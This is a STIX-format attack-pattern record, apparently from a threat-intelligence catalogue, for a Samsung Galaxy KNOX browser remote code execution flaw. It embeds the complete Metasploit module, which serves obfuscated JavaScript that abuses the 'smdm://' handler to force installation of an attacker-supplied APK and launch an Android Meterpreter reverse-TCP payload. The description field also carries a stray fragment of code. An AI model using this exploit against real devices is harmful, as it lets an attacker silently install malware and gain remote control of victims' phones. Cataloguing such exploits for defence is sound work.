{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f7d5315e-2da4-405d-a8c9-d95be6edaf57",
    "created": "2024-08-14T16:35:03.874252Z",
    "modified": "2024-08-14T16:35:03.874257Z",
    "name": "Samsung Galaxy KNOX Android Browser RCE",
    "description": " A vulnerability exists in the KNOX security component of the Samsung Galaxy firmware that allows a remote webpage to install an APK with arbitrary permissions by abusing the 'smdm://' protocol handler registered by the KNOX component.  The vulnerability has been confirmed in the Samsung Galaxy S4, S5, Note 3 and Ace 4.  'License'             => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/android/browser/samsung_knox_smdm_url.rb",
            "external_id": "samsung_knox_smdm_url.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.quarkslab.com/abusing-samsung-knox-to-remotely-install-a-malicious-application-story-of-a-half-patched-vulnerability.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'digest/md5'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  # Hash that maps payload ID -> (0|1) if an HTTP request has\n  # been made to download a payload of that ID\n  attr_reader :served_payloads\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'                => 'Samsung Galaxy KNOX Android Browser RCE',\n      'Description'         => %q{\n        A vulnerability exists in the KNOX security component of the Samsung Galaxy\n        firmware that allows a remote webpage to install an APK with arbitrary\n        permissions by abusing the 'smdm://' protocol handler registered by the KNOX\n        component.\n\n        The vulnerability has been confirmed in the Samsung Galaxy S4, S5, Note 3,\n        and Ace 4.\n      },\n      'License'             => MSF_LICENSE,\n      'Author'              => [\n        'Andre Moulu', # discovery, advisory, and exploitation help\n        'jduck', # msf module\n        'joev'   # msf module\n      ],\n      'References'          => [\n        ['URL', 'http://blog.quarkslab.com/abusing-samsung-knox-to-remotely-install-a-malicious-application-story-of-a-half-patched-vulnerability.html'],\n        ['OSVDB', '114590']\n      ],\n      'Platform'            => 'android',\n      'Arch'                => ARCH_DALVIK,\n      'DefaultOptions'      => { 'PAYLOAD' => 'android/meterpreter/reverse_tcp' },\n      'Targets'             => [ [ 'Automatic', {} ] ],\n      'DisclosureDate'      => '2014-11-12',\n      'DefaultTarget'       => 0,\n\n      'BrowserRequirements' => {\n        :source     => 'script',\n        :os_name    => OperatingSystems::Match::ANDROID\n      }\n    ))\n\n    register_options([\n      OptString.new('APK_VERSION', [\n        false, \"The update version to advertise to the client\", \"1337\"\n      ])\n    ])\n\n    deregister_options('JsObfuscate')\n  end\n\n  def exploit\n    @served_payloads = Hash.new(0)\n    super\n  end\n\n  def apk_bytes\n    payload.encoded\n  end\n\n  def on_request_uri(cli, req)\n    if req.uri =~ /\\/([a-zA-Z0-9]+)\\.apk\\/latest$/\n      if req.method.upcase == 'HEAD'\n        print_status \"Serving metadata...\"\n        send_response(cli, '', magic_headers)\n      else\n        print_status \"Serving payload '#{$1}'...\"\n        @served_payloads[$1] = 1\n        send_response(cli, apk_bytes, magic_headers)\n      end\n    elsif req.uri =~ /_poll/\n      vprint_status(\"Polling #{req.qstring['id']}: #{@served_payloads[req.qstring['id']]}\")\n      send_response(cli, @served_payloads[req.qstring['id']].to_s, 'Content-type' => 'text/plain')\n    elsif req.uri =~ /launch$/\n      send_response_html(cli, launch_html)\n    else\n      super\n    end\n  end\n\n  # The browser appears to be vulnerable, serve the exploit\n  def on_request_exploit(cli, req, browser)\n    print_status \"Serving exploit...\"\n    send_response_html(cli, generate_html)\n  end\n\n  def magic_headers\n    { 'Content-Length' => apk_bytes.length,\n      'ETag' => Digest::MD5.hexdigest(apk_bytes),\n      'x-amz-meta-apk-version' => datastore['APK_VERSION'] }\n  end\n\n  def generate_html\n    %Q|\n      <!doctype html>\n      <html><body>\n      <script>\n      #{exploit_js}\n      </script></body></html>\n    |\n  end\n\n  def exploit_js\n    payload_id = rand_word\n\n    js_obfuscate %Q|\n\n      function poll() {\n        var xhr = new XMLHttpRequest();\n        xhr.open('GET', '_poll?id=#{payload_id}&d='+Math.random()*999999999999);\n        xhr.onreadystatechange = function(){\n          if (xhr.readyState == 4) {\n            if (xhr.responseText == '1') {\n              setTimeout(killEnrollment, 100);\n            } else {\n              setTimeout(poll, 1000);\n              setTimeout(enroll, 0);\n              setTimeout(enroll, 500);\n            }\n          }\n        };\n        xhr.onerror = function(){\n          setTimeout(poll, 1000);\n          setTimeout(enroll, 0);\n        };\n        xhr.send();\n      }\n\n      function enroll() {\n        var loc = window.location.href.replace(/[/.]$/g, '');\n        top.location = 'smdm://#{rand_word}?update_url='+\n          encodeURIComponent(loc)+'/#{payload_id}.apk';\n      }\n\n      function killEnrollment() {\n        top.location = \"intent://#{rand_word}?program=\"+\n          \"#{rand_word}/#Intent;scheme=smdm;launchFlags=268468256;end\";\n        setTimeout(launchApp, 300);\n      }\n\n      function launchApp() {\n        top.location='intent:view#Intent;SEL;component=com.metasploit.stage/.MainActivity;end';\n      }\n\n      enroll();\n      setTimeout(poll,600);\n\n    |\n  end\n\n  def rand_word\n    Rex::Text.rand_text_alphanumeric(3+rand(12))\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-12",
    "x_mitre_platforms": [
        "android'"
    ]
}